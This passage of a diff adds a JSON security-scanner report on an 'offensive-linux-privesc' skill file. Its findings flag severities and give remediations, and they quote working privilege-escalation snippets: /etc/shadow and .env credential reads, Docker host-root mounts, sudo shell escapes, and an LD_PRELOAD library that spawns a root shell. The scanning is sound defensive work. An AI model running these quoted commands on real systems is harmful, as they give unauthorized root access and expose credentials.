+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n# Backup files and shadow\nfind / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" 2>/dev/null\ncat /etc/shadow 2>/dev/null\nls -la /etc/shadow\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 494,
+              "end_line": null,
+              "start_column": 4
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-9bcf5448fc5b4ee49dd1ceda466969a6",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 495,
+            "end_line": null,
+            "start_column": 7
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# Backup files and shadow\nfind / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" 2>/dev/null\ncat /etc/shadow 2>/dev/null\nls -la /etc/shadow\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 495,
+              "end_line": null,
+              "start_column": 7
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-979a6613b73f443b8069ff6c3ac8a644",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 540,
+            "end_line": null,
+            "start_column": 21
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "  find / -perm -4000 -type f 2>/dev/null     # SUID binaries\n  getcap -r / 2>/dev/null                    # Capabilities\n  cat /etc/crontab && ls -la /etc/cron.*     # Cron jobs\n  ls -la /etc/passwd /etc/shadow             # File permissions\n  cat /etc/exports 2>/dev/null               # NFS shares\n  uname -a && cat /etc/os-release            # Kernel version\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 540,
+              "end_line": null,
+              "start_column": 21
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE5",
+          "finding_id": "finding-bd43a4a7afef45dc8dee18fcd5ec01f9",
+          "category": "Privilege Escalation",
+          "pattern": "Privileged Container / Container Escape",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 384,
+            "end_line": null,
+            "start_column": 11
+          },
+          "finding": "-v /:",
+          "explanation": "Potential security issue detected. Manual review is recommended.",
+          "remediation": "Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.",
+          "code_snippet": "groups\n\n# Mount the host root filesystem\ndocker run -v /:/hostfs -it ubuntu /bin/bash\n\n# Inside the container, access host filesystem\ncat /hostfs/etc/shadow",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "646964799806bc8027131d495c3dd146ee2cab694f4d3e2fbeec8142d515f5c9",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 384,
+              "end_line": null,
+              "start_column": 11
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE5",
+          "finding_id": "finding-8ae4c2c19dbf4e84b31aa3d6ad33fe7d",
+          "category": "Privilege Escalation",
+          "pattern": "Privileged Container / Container Escape",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 395,
+            "end_line": null,
+            "start_column": 11
+          },
+          "finding": "-v /:",
+          "explanation": "Potential security issue detected. Manual review is recommended.",
+          "remediation": "Review the flagged content for security risks. Ensure no credentials, secrets, or sensitive data are exposed.",
+          "code_snippet": "chmod +s /hostfs/tmp/rootbash\n\n# Alternative: use docker socket directly\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n```\n\nLXD/LXC group membership provides a similar attack surface. Build a privileged container and mount the host filesystem.",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "646964799806bc8027131d495c3dd146ee2cab694f4d3e2fbeec8142d515f5c9",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 395,
+              "end_line": null,
+              "start_column": 11
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR1",
+          "finding_id": "finding-9808c73267364fcdab7b3a48b971595b",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'backdoor_persistence': Backdoor persistence with malicious payloads (shell commands, SSH key injection, hidden root users) [malware]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 426,
+            "end_line": null
+          },
+          "finding": "LD_PRELOAD=/tmp/preload.so",
+          "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+          "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+          "code_snippet": "itrary code as root.\n\n### LD_PRELOAD\n\n```c\n// preload.c -- compile and load via sudo\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    system(\"/bin/bash -p\");\n}\n```\n\n```bash\n# Compile\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\n\n# Execute with sudo (requires env_keep += LD_PRELOAD in sudoers)\nsudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command\n```\n\n### LD_LIBRARY_PATH\n\n```bash\n# Find shared libraries used by a sudo-allowed binary\nldd /usr/sbin/apache2\n\n# Create a malicious replacement\n# Target a library like libcrypt.so.1\ngcc -fPIC -shared -o /tmp/libcrypt.so.1 preload.c\n\n# Execute with sudo\nsudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2\n```\n\nYou can also hijack shared libraries loaded by SUID binaries. Use `strace` to find missing library loads from writable directories, then place your malicious `.so` there.\n\n---\n\n## Service Misconfigurations\n\nWritable service files or binaries ",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "65f3e6e59f164cd797d6430dbc22c2db45f9389729bf1c191856ce3f02ec5c4f",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 426,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-ecce00081297427889ab358dd06fd971",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 490,
+            "end_line": null,
+            "start_column": 40
+          },
+          "finding": ".env ",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n# Configuration files with credentials\ngrep -rl \"pass\\|pwd\\|token\\|secret\\|key\" /etc/ /opt/ /var/www/ /home/ 2>/dev/null\ncat /var/www/*/wp-config.php /var/www/*/.env 2>/dev/null\n\n# Backup files and shadow\nfind / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" 2>/dev/null",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "66ef81c27c03406fd9935e5fc86fc4126d7150c15b8d076fdc528d05cea7c7bf",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 490,
+              "end_line": null,
+              "start_column": 40
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM2",
+          "finding_id": "finding-cc23b8b7bdc6484c9ebd6b4a9455fba4",
+          "category": "Tool Misuse",
+          "pattern": "Chaining Abuse",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 509,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "| Sudo ",
+          "explanation": "Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow.",
+          "remediation": "Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.",
+          "code_snippet": "| LinPEAS/enumeration | Process execution of curl piped to sh, large bursts of file access in /proc, /etc, /sys |\n| SUID abuse | Execution of SUID binaries from unusual parent processes, shell spawning from SUID context |\n| Capabilities abuse | Unexpected setuid(0) calls from non-SUID processes, audit logs for CAP_SETUID usage |\n| Sudo exploitation | Auth logs showing sudo usage for unusual commands, sudoers file modification timestamps |\n| CVE-2021-3156 | sudoedit crash logs, coredumps, heap corruption signatures in audit logs |\n| Cron hijacking | Modified cron scripts (integrity monitoring), new files with tar flag names |\n| /etc/passwd writes | File integrity monitoring alerts, new UID 0 entries, inotify watches |",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "4055753963963fe7e42b45286d49c4618e804b435d0d85c7ab280d14cc0e6100",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 509,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-e7da147497f7461a9ab62caccfe49d0f",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null,
+            "start_column": 292
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "---\nname: offensive-linux-privesc\ndescription: \"Comprehensive Linux privilege escalation methodology for offensive security engagements. Covers the full attack surface from a low-privilege shell to root: SUID/SGID binary abuse via GTFOBins, Linux capabilities exploitation (cap_setuid, cap_dac_override, cap_dac_read_search), sudo misconfigurations including NOPASSWD rules and Baron Samedit (CVE-2021-3156), cron job abuse through writable scripts, PATH hijacking, and wildcard injection with tar/rsync/chown. Includes writable /etc/passwd attacks, NFS no_root_squash exploitation, kernel exploits (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034), Docker group container escapes, LD_PRELOAD and LD_LIBRARY_PATH hijacking for shared library injection, systemd service misconfigurations, and sensitive file enumeration for credential harvesting. Integrates automated enumeration with LinPEAS, linux-exploit-suggester, pspy for process monitoring, and GTFOBins for binary exploit",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 3,
+              "end_line": null,
+              "start_column": 292
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-f407314efc644abf8503abc0946e7cfa",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 15,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "## Quick Workflow\n\n1. Run automated enumeration (LinPEAS, linux-exploit-suggester) to surface quick wins.\n2. Check sudo permissions, SUID/SGID binaries, and capabilities first -- these are the highest-probability vectors.\n3. Enumerate cron jobs, writable scripts, and PATH ordering for hijack opportunities.\n4. Inspect file permissions on /etc/passwd, /etc/shadow, service configs, and SSH keys.\n5. Check for NFS shares with no_root_squash and Docker group membership.",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 15,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-0de07c197f1544be8aeb54e9406f0011",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 148,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# If sudo allows vi/vim NOPASSWD\nsudo vim -c '!bash'\n\n# If sudo allows less NOPASSWD\nsudo less /etc/shadow\n!/bin/bash\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 148,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c56726adbba04fceb4792116a8cdf96c",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 149,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo vim -c '!bash'\n\n# If sudo allows less NOPASSWD\nsudo less /etc/shadow\n!/bin/bash\n\n# If sudo allows awk NOPASSWD",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 149,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-659c897508ac42eaac6ed589e94e41be",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 152,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo less /etc/shadow\n!/bin/bash\n\n# If sudo allows awk NOPASSWD\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# If sudo allows find NOPASSWD",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 152,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3ecbb2b6a4af42b9a40abdd9009d3b91",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 153,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "!/bin/bash\n\n# If sudo allows awk NOPASSWD\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# If sudo allows find NOPASSWD\nsudo find /tmp -exec /bin/bash \\;",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 153,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-1c907e511a544ffebd6e6d55794d1631",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 155,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# If sudo allows awk NOPASSWD\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# If sudo allows find NOPASSWD\nsudo find /tmp -exec /bin/bash \\;\n\n# If sudo allows env NOPASSWD (LD_PRELOAD)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 155,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-76a2340dd9a84712b9347e429b0e1e5d",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 156,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# If sudo allows find NOPASSWD\nsudo find /tmp -exec /bin/bash \\;\n\n# If sudo allows env NOPASSWD (LD_PRELOAD)\n# See LD_PRELOAD section below",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 156,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-21bfd1e713cb4eccbd57f5d09cf50d6a",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 158,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# If sudo allows find NOPASSWD\nsudo find /tmp -exec /bin/bash \\;\n\n# If sudo allows env NOPASSWD (LD_PRELOAD)\n# See LD_PRELOAD section below\n\n# If sudo allows a script you can write to",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 158,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-e04eaea4fa72450c9326c5908000c03d",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 161,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "# If sudo allows env NOPASSWD (LD_PRELOAD)\n# See LD_PRELOAD section below\n\n# If sudo allows a script you can write to\necho '/bin/bash' > /path/to/writable_script.sh\nsudo /path/to/writable_script.sh\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 161,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ac61cd21af7e467b9e56ce3faee178e2",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 163,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# If sudo allows a script you can write to\necho '/bin/bash' > /path/to/writable_script.sh\nsudo /path/to/writable_script.sh\n\n# If sudo allows running as another user\nsudo -u targetuser /bin/bash",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 163,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7d3d0cbac1824bbf8e27ae5e2cc0d10f",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 404,
+            "end_line": null,
+            "start_column": 5
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n## LD_PRELOAD and LD_LIBRARY_PATH Hijacking\n\nWhen sudo preserves `env_keep += LD_PRELOAD` or `env_keep += LD_LIBRARY_PATH`, you can inject a shared library that executes arbitrary code as root.\n\n### LD_PRELOAD\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 404,
+              "end_line": null,
+              "start_column": 5
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-59151d5b6f2c47eeaf78b8e2849b9aa9",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 509,
+            "end_line": null,
+            "start_column": 40
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "| LinPEAS/enumeration | Process execution of curl piped to sh, large bursts of file access in /proc, /etc, /sys |\n| SUID abuse | Execution of SUID binaries from unusual parent processes, shell spawning from SUID context |\n| Capabilities abuse | Unexpected setuid(0) calls from non-SUID processes, audit logs for CAP_SETUID usage |\n| Sudo exploitation | Auth logs showing sudo usage for unusual commands, sudoers file modification timestamps |\n| CVE-2021-3156 | sudoedit crash logs, coredumps, heap corruption signatures in audit logs |\n| Cron hijacking | Modified cron scripts (integrity monitoring), new files with tar flag names |\n| /etc/passwd writes | File integrity monitoring alerts, new UID 0 entries, inotify watches |",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 509,
+              "end_line": null,
+              "start_column": 40
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-b741dcd347de4493a1a7a998ef1b566f",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 545,
+            "end_line": null,
+            "start_column": 27
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "  uname -a && cat /etc/os-release            # Kernel version\n\nPHASE 2 -- QUICK WINS\n  GTFOBins lookup for SUID/sudo binaries     # https://gtfobins.github.io\n  sudo vim -c '!bash'                        # Sudo escape\n  python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'  # cap_setuid\n  bash -p                                    # SUID bash",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 545,
+              "end_line": null,
+              "start_column": 27
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-10ed69502c8d42238a8f8f8c6bef6d04",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 546,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\nPHASE 2 -- QUICK WINS\n  GTFOBins lookup for SUID/sudo binaries     # https://gtfobins.github.io\n  sudo vim -c '!bash'                        # Sudo escape\n  python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'  # cap_setuid\n  bash -p                                    # SUID bash\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 546,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-6d7e76a750054785b622a9edac8fa0cc",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 553,
+            "end_line": null,
+            "start_column": 17
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "PHASE 3 -- ESCALATION\n  Writable cron script injection\n  PATH hijack in cron or SUID binary\n  LD_PRELOAD via sudo env_keep\n  Docker mount host filesystem\n  /etc/passwd append (if writable)\n",
+          "intent": null,
